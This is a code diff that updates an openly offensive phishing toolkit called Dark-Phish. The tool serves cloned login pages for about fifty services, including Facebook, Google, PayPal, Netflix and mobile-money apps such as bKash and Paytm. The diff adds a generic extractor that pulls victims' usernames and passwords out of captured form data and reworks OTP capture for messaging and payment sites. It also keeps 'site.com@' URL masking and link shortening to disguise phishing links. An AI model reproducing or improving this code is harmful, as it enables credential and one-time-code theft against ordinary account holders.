@@ -1,4 +1,4 @@
-#!/use/bin/env python3
+#!/usr/bin/env python3
 """
 Tool Name: Dark-Phish
 Author: Sajjad
@@ -22,8 +22,7 @@ except ModuleNotFoundError as error:
 	sys.exit()
 	
 
-
-version = 2.2
+version = "2.2.1"
 host = "127.0.0.1"
 port = "8080"
 
@@ -64,13 +63,6 @@ def check_update():
 			print("\033[1;91mUnable to check updates! Please check your internet connection or try again later.\033[0;0m\n")
 	except:
 		print("\033[1;91mUnable to check updates! Please check your internet connection or try again later.\033[0;0m\n")
-
-
-
-
-
-
-
 
 
 def user_pass(data):
@@ -302,6 +294,12 @@ def download_ngrok():
 			os.system("tar zxvf "+file)
 			os.system("chmod +x ngrok")
 			authtoken = input("Ngrok authtoken: ")
+			prefix = "ngrok config add-authtoken "
+			if authtoken.startswith(prefix):
+				authtoken = authtoken[len(prefix):].strip()
+			else:
+				pass
+
 			os.system("./ngrok config add-authtoken {} > /dev/null 2>&1".format(authtoken))
 			os.system("mv ngrok core")
 			os.system("rm -rf "+file)
@@ -507,11 +505,11 @@ def is_gd(main_url):
 		if (r.status_code == 200):
 			short = r.text.strip()
 		else:
-			pass
+			short = None
 		r.close()
 		return short
 	except:
-		pass 
+		return None
 		
 def tiny_url(main_url):
 	api = "https://tinyurl.com/api-create.php?url="
@@ -524,11 +522,12 @@ def tiny_url(main_url):
 			shortener = pyshorteners.Shortener()
 			short = shortener.tinyurl.short(main_url)
 		else:
-			pass
+			short = None
 		r.close()
 		return short
 	except:
 		pass
+		return None
 
 
 def da_gd(main_url):
@@ -539,31 +538,21 @@ def da_gd(main_url):
 		if (r.status_code == 200):
 			short = r.text.strip()
 		else:
-			pass
+			short = None
 		r.close()
 		return short
 	except:
-		pass
+		return None
 
 
 
 
 
 def modify_url(keyword, url):
-	try:
-		shorted1 = is_gd(url)
-	except:
-			pass
-	try:
-		shorted2 = tiny_url(url)
-	except:
-		pass
-	try:
-		shorted3 = da_gd(url)
-	except:
-		pass
-		
-		
+	shorted1 = is_gd(url)
+	shorted2 = tiny_url(url)
+	shorted3 = da_gd(url)
+	modified_urls = []
 		
 	
 	try:
@@ -572,43 +561,47 @@ def modify_url(keyword, url):
 		else:
 			url = url.replace("http://","",1)
 		modified_url1 = keyword + url   
+		modified_urls.append(modified_url1)
 	except:
-		modified_url1 = None
+		pass
 		
 		
-	
-	try:
-		if("https" in shorted1):
-			shorted1= shorted1.replace("https://","",1)
-		else:
-			shorted1 = shorted1.replace("http://","",1)
-		modified_url2 = keyword + shorted1
-	except:
-		modified_url2 = None
+	if shorted1:
+		try:
+			if("https" in shorted1):
+				shorted1= shorted1.replace("https://","",1)
+			else:
+				shorted1 = shorted1.replace("http://","",1)
+			modified_url2 = keyword + shorted1
+			modified_urls.append(modified_url2)
+		except:
+			pass
 		
 		
-	
-	try:
-		if("https" in shorted2):
-			shorted2 = shorted2.replace("https://","",1) 
-		else:
-			shorted2 = shorted2.replace("http://","",1)
-		modified_url3 = keyword + shorted2
-	except:
-		modified_url3 = None
+	if shorted2:
+		try:
+			if("https" in shorted2):
+				shorted2 = shorted2.replace("https://","",1) 
+			else:
+				shorted2 = shorted2.replace("http://","",1)
+			modified_url3 = keyword + shorted2
+			modified_urls.append(modified_url3)
+		except:
+			pass
 		
 		
-	
-	try:
-		if("https" in shorted3):
-			shorted3 = shorted3.replace("https://","",1)
-		else:
-			shorted3 = shorted3.replace("http://","",1)
-		modified_url4 = keyword + shorted3
-	except:
-			modified_url4 = None
+	if shorted3:
+		try:
+			if("https" in shorted3):
+				shorted3 = shorted3.replace("https://","",1)
+			else:
+				shorted3 = shorted3.replace("http://","",1)
+			modified_url4 = keyword + shorted3
+			modified_urls.append(modified_url4)
+		except:
+			pass
 			
-	return modified_url1, modified_url2, modified_url3, modified_url4
+	return modified_urls
 	
 
 keywords = {
@@ -654,7 +647,7 @@ keywords = {
 "Discord" : "https://www.discord.com@",
 "Daraz" : "https://www.daraz.com@",
 "Whatsapp" : "https://account.whatsapp.com@",
-"Telegram" : "https://web.telegram.com@",
+"Telegram" : "https://web.telegram.org@",
 "Signal" : "https://www.signal.com@",
 "Imo" : "https://imo.com@",
 "Bkash" : "https://www.bkash.com.bd@",
@@ -792,23 +785,9 @@ sleep 12""".format(host, port))
 	
 	if (condition == "y" or condition == "yes"):
 		keyword = keywords[action]
-		modified= modify_url(keyword, link)
-		if (modified[0] != None):
-			print("\033[1;92mSend link:\033[0;0m", modified[0])
-		else:
-			pass
-		if (modified[1] != None):
-			print("\033[1;92mSend link:\033[0;0m", modified[1])
-		else:
-			pass
-		if (modified[2] != None):
-			print("\033[1;92mSend link:\033[0;0m", modified[2])
-		else:
-			pass
-		if (modified[3] != None):
-			print("\033[1;92mSend link:\033[0;0m", modified[3])
-		else:
-			pass
+		modified = modify_url(keyword, link)
+		for modified_url in modified:
+			print("\033[1;92mSend link:\033[0;0m", modified_url)
 	else:
 		pass
 	
@@ -886,40 +865,15 @@ def work():
 	return log
 	
 def work_otp():
-	username = ""
-	password = ""
 	otp_code = ""
+	
 	try:
 		print("")
 		while not (os.path.exists("log.txt")):
-			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
-			time.sleep(1)
-			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="")
-			time.sleep(1)
-			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="")
-			time.sleep(1)
-			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="")
-			time.sleep(1)
-			if (os.path.exists("log.txt") == True):
-				print("\r\033[1;92mCredentials found.            \033[0;0m")
-				try:
-					log_file = open("log.txt","r")
-					log = log_file.read()
-					log_file.close()
-					print("")
-					print(log)
-					try:
-						lines = log.split("\n")
-						for line in lines:
-							if line.startswith("Username: "):
-								username = line.split(": ")[1].strip()
-							elif line.startswith("Password: "):
-							 password = line.split(": ")[1].strip()
-							 
-					except Exception as error:
-						print(error)
-				except:
-					pass
+			log = work()
+			print("")
+			username, password = extract_data(log)
+
 		while not (os.path.exists("otp.txt")):
 			print("\r\033[1;92mWaiting for the otp   \033[0;0m",end="")
 			time.sleep(1)
@@ -1017,6 +971,34 @@ def available_tunnels():
 		print("\033[1;91m[!] Invalid option!\033[0;0m\n")
 			
 
+def extract_key_value(line):
+	if "=" in line:
+		key, value = line.split("=", 1)
+
+		return key, value.strip()
+	return None, None
+
+def extract_data(log):
+	username = None
+	password = None
+	for line in log.splitlines():
+		key, value = extract_key_value(line)
+		if key:
+			if any(k in key.lower() for k in ["username", "email", "user", "usernameoremail", "login", "j_username", "login_email", "login_username", "userid", "userloginid"]):
+				username = value
+			elif any(k in key.lower() for k in ["password", "passwd", "pass", "j_password", "login_password"]):
+				password = value
+
+	if username:
+		username = "Username: {}".format(username)
+		print(username)
+	if password:
+		password = "Password: {}".format(password)
+		print(password)
+
+	return username, password
+
+
 if (option==1):
 	try:
 		site = "Facebook"
@@ -1025,18 +1007,8 @@ if (option==1):
 		server("Facebook")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if "email" in line:
-				username = line.replace("email=","Username: ",1)
-			elif "pass" in line:
-				password = line.replace("pass=","Password: ",1)
-				
-		print(username)
-		print(password)
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1055,19 +1027,8 @@ elif (option==2):
 		server("Twitter")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if ("usernameOrEmail" in line):
-				username = line.replace("usernameOrEmail=","Username: ",1)
-			elif ("pass" in line):
-				password = line.replace("pass=","Password: ",1)
-				
-		print(username)
-		print(password)
-		
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1086,18 +1047,8 @@ elif (option==3):
 		server("Instagram")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if ("username" in line):
-				username = line.replace("username=","Username: ",1)
-			elif ("password" in line):
-				password = line.replace("password=","Password: ",1)
-			
-		print(username)
-		print(password)
-		
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1116,19 +1067,8 @@ elif (option==4):
 		server("Snapchat")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if ("username" in line):
-				username = line.replace("username=","Username: ",1)
-			elif ("password" in line):
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-		
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1147,18 +1087,8 @@ elif (option==5):
 		server("GitHub")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if ("login" in line):
-				username = line.replace("login=","Username: ",1)
-			elif "password" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1177,19 +1107,8 @@ elif (option==6):
 		server("Google")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if "Email" in line:
-				username = line.replace("Email=","Username: ",1)
-			elif("Passwd" in line):
-				password = line.replace("Passwd=","Password: ",1)
-		
-		print(username)
-		print(password)
-		
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1208,18 +1127,9 @@ elif (option==7):
 		server("Yahoo")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if("username" in line):
-				username = line.replace("username=","Username: ",1)
-			elif ("passwd" in line):
-				password = line.replace("passwd=","Password: ",1)
-				
-		print(username)
-		print(password)
+
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1238,19 +1148,10 @@ elif (option==8):
 		server("PlayStation")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		
-		for line in log.split():
-			if ("j_username" in line):
-				username = line.replace("j_username=","Username: ",1)
-				
-			elif("j_password" in line):
-				password = line.replace("j_password=","Password: ",1)
-		
-		print(username)
-		print(password)
+
+		username, password = extract_data(log)
+
 		stop()
 		ip_data()
 		try:
@@ -1269,19 +1170,10 @@ elif(option==9):
 		server("PayPal")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
 		
-		for line in log.split():
-			if ("login_email" in line):
-				username = line.replace("login_email=","Username: ",1)
-			elif ("login_password" in line):
-				password = line.replace("login_password=","Password: ",1)
-				
-		print(username)
-		print(password)
-		
+		username, password = extract_data(log)
+
 		stop()
 		ip_data()
 		try:
@@ -1304,15 +1196,7 @@ elif(option==10):
 				password = ""
 				otp = ""
 				
-				for line in log.split():
-					if ("login_username" in line):
-						username = line.replace("login_username=","Username: ",1)
-						
-					elif ("login_password" in line):
-						password = line.replace("login_password=","Password: ",1)
-				
-				print(username)
-				print(password)
+				username, password = extract_data(log)
 			
 				stop()
 				ip_data()
@@ -1335,16 +1219,7 @@ elif (option==11):
 				username = ""
 				password = ""
 				otp = ""
-				for line in log.split():
-					if "email" in line:
-						username = line.replace("email=","Username: ",1)
-					
-					elif "password" in line:
-						password = line.replace("password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1367,15 +1242,7 @@ elif (option==12):
 				username = ""
 				password = ""
 				otp = ""
-				for line in log.split():
-					if "login_username" in line:
-						username = line.replace("login_username=","Username: ",1)
-					elif "login_password" in line:
-						password = line.replace("login_password=","Password: ",1)
-					
-				print(username)
-				print(password)
-				
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1398,15 +1265,7 @@ elif (option==13):
 				username = ""
 				password = ""
 				otp = ""
-				for line in log.split():
-					if "login_username" in line:
-						username = line.replace("login_username=","Username: ",1)
-					elif "login_password" in line:
-						password = line.replace("login_password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1426,19 +1285,8 @@ elif (option==14):
 				server("WordPress")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp=""
-				for line in log.split():
-					if "login_username" in line:
-						 
-						username = line.replace("login_username=","Username: ",1)
-					elif "login_password" in line:
-						password = line.replace("login_password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1458,18 +1306,8 @@ elif (option==15):
 				server("GitLab")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if "login_username" in line:
-						username = line.replace("login_username=","Username: ",1)
-					elif "login_password" in line:
-						password = line.replace("login_password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1488,18 +1326,8 @@ elif (option==16):
 				server("ProtonMail")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if ("login_username" in line):
-						username = line.replace("login_username=","Username: ",1)
-					elif ("login_password" in line):
-						password = line.replace("login_password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1518,18 +1346,8 @@ elif (option==17):
 				server("Linkedin")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if "login_username" in line:
-						username = line.replace("login_username=","Username: ",1)
-					elif ("login_password" in line):
-						password = line.replace("login_password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+				username, password = extract_data(log)
 				stop()
 				ip_data()
 				try:
@@ -1548,18 +1366,10 @@ elif (option==18):
 				server("Steam")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if ("username" in line):
-						username = line.replace("username=","Username: ",1)
-					elif ("password" in line):
-						password = line.replace("password=","Password: ",1)
-				
-				print(username)
-				print(password)
-					
+
+				username, password = extract_data(log)
+
 				stop()
 				ip_data()
 				try:
@@ -1578,17 +1388,9 @@ elif (option==19):
 				server("Twitch")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if "username" in line:
-						username = line.replace("username=","Username: ",1)
-					elif ("password" in line):
-						password = line.replace("password=","Password: ",1)
-				
-				print(username)
-				print(password)
+
+				username, password = extract_data(log)
 					
 				stop()
 				ip_data()
@@ -1608,17 +1410,9 @@ elif (option==20):
 				server("VK")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if "username" in line:
-						username = line.replace("username=","Username: ",1)
-					elif "password" in line:
-						password = line.replace("password=","Password: ",1)
-				
-				print(username)
-				print(password)
+
+				username, password = extract_data(log)
 					
 				stop()
 				ip_data()
@@ -1638,17 +1432,9 @@ elif (option==21):
 		server("Pinterest")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
+
+		username, password = extract_data(log)
 					
 		stop()
 		ip_data()
@@ -1668,17 +1454,9 @@ elif (option==22):
 				server("Wi-Fi")
 				work()
 				log=work()
-				username = ""
-				password = ""
 				otp = ""
-				for line in log.split():
-					if "username" in line:
-						username = line.replace("username=","Username: ",1)
-					elif "password" in line:
-						password = line.replace("password=","Password: ",1)
-				
-				print(username)
-				print(password)
+
+				username, password = extract_data(log)
 					
 				stop()
 				ip_data()
@@ -1698,18 +1476,10 @@ elif (option==23):
 		server("Badoo")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "email" in line:
-				username = line.replace("email=","Username: ",1)
-			elif "password" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-		
+
+		username, password = extract_data(log)
+
 		stop()
 		ip_data()
 		try:
@@ -1728,18 +1498,10 @@ elif (option==24):
 		server("Bitcoin")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-		
+
+		username, password = extract_data(log)
+
 		stop()
 		ip_data()
 		try:
@@ -1758,18 +1520,10 @@ elif (option==25):
 		server("Adobe")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-		
+
+		username, password = extract_data(log)
+
 		stop()
 		ip_data()
 		try:
@@ -1788,17 +1542,9 @@ elif (option==26):
 		server("Amazon")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "email" in line:
-				username = line.replace("email=","Username: ",1)
-			elif "password" in line:
-				password = line.replace("password=","Password: ",1)
-				
-		print(username)
-		print(password)
+
+		username, password = extract_data(log)
 		
 		stop()
 		ip_data()
@@ -1818,16 +1564,9 @@ elif (option==27):
 		server("Ebay")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if ("userid=" in line):
-				username = line.replace("userid=","Username: ",1)
-			elif ("pass" in line):
-				password = line.replace("pass=","Password: ",1)
-		print(username)
-		print(password)
+
+		username, password = extract_data(log)
 		
 		stop()
 		ip_data()
@@ -1847,17 +1586,9 @@ elif (option==28):
 		server("Netflix")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if("userLoginId=" in line):
-				username = line.replace("userLoginId=","Username: ",1)
-			elif("password=" in line):
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
+
+		username, password = extract_data(log)
 				
 		stop()
 		ip_data()
@@ -1877,18 +1608,8 @@ elif (option==29):
 		server("Messenger")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1908,18 +1629,8 @@ elif (option==30):
 		server("X")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1939,18 +1650,8 @@ elif (option==31):
 		server("Galaxy_Store")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -1970,18 +1671,8 @@ elif (option==32):
 		server("Google_Drive")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2001,18 +1692,8 @@ elif (option==33):
 		server("Google_Photos")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2032,18 +1713,8 @@ elif (option==34):
 		server("OneDrive")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2063,18 +1734,8 @@ elif (option==35):
 		server("PlayStore")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2094,18 +1755,8 @@ elif (option==36):
 		server("Snaptube")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2125,18 +1776,8 @@ elif (option==37):
 		server("Spotify")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2156,18 +1797,8 @@ elif (option==38):
 		server("TikTok")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2187,18 +1818,8 @@ elif (option==39):
 		server("Discord")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2218,18 +1839,8 @@ elif (option==40):
 		server("Daraz")
 		work()
 		log=work()
-		username = ""
-		password = ""
 		otp = ""
-		for line in log.split():
-			if "username=" in line:
-				username = line.replace("username=","Username: ",1)
-			elif "password=" in line:
-				password = line.replace("password=","Password: ",1)
-		
-		print(username)
-		print(password)
-				
+		username, password = extract_data(log)
 		stop()
 		ip_data()
 		try:
@@ -2247,13 +1858,7 @@ elif (option==41):
 		available_tunnels()
 		os.chdir("core/sites/Whatsapp")
 		server("Whatsapp")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2272,13 +1877,7 @@ elif (option==42):
 		available_tunnels()
 		os.chdir("core/sites/Telegram")
 		server("Telegram")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2297,13 +1896,7 @@ elif (option==43):
 		available_tunnels()
 		os.chdir("core/sites/Signal")
 		server("Signal")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2322,13 +1915,7 @@ elif (option==44):
 		available_tunnels()
 		os.chdir("core/sites/Imo")
 		server("Imo")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2347,13 +1934,7 @@ elif (option==45):
 		available_tunnels()
 		os.chdir("core/sites/Bkash")
 		server("Bkash")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2372,13 +1953,7 @@ elif (option==46):
 		available_tunnels()
 		os.chdir("core/sites/Nagad")
 		server("Nagad")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2397,13 +1972,7 @@ elif (option==47):
 		available_tunnels()
 		os.chdir("core/sites/Rocket")
 		server("Rocket")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2422,13 +1991,7 @@ elif (option==48):
 		available_tunnels()
 		os.chdir("core/sites/Paytm")
 		server("Paytm")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2447,13 +2010,7 @@ elif (option==49):
 		available_tunnels()
 		os.chdir("core/sites/Flipkart")
 		server("Flipkart")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2472,13 +2029,7 @@ elif (option==50):
 		available_tunnels()
 		os.chdir("core/sites/PhonePe")
 		server("PhonePe")
-		data = work_otp()
-		try:
-			username = "Username: " + data[0]
-			password = "Password: " + data[1]
-			otp = "OTP: " + data[2]
-		except Exception as error:
-			print(error)
+		username, password, otp = work_otp()
 		stop()
 		ip_data()
 		try:
@@ -2582,18 +2133,8 @@ button {
 				server("Custom")
 				work()
 				log=work()
-				username = ""
-				password = ""
+				username, password = extract_data(log)
 				otp = ""
-				for line in log.split():
-					if "username" in line:
-						username = line.replace("username=","Username: ",1)
-					elif "password" in line:
-						password = line.replace("password=","Password: ",1)
-				
-				print(username)
-				print(password)
-				
 				stop()
 				ip_data()
 				try:
